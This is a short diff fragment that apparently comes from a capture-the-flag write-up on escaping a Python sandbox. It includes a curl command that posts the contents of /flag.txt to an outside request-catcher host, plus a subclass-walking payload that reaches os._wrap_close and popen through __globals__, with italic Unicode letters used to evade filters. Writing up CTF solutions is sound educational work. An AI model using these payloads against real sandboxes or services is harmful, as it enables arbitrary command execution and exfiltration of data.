@@ -48,6 +48,10 @@ curl -X POST -d `cat /flag.txt` https://asdfasdfasdf.free.beeceptor.com
 
 1. first get access to popen
 
+find this class (140)
+<class 'os._wrap_close'>
+
+().__class__.__base__.__subclasses__()[140]
 [*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]
 
 - because italicised characters dont work to index the dictionary, unpack the dictionary into an array
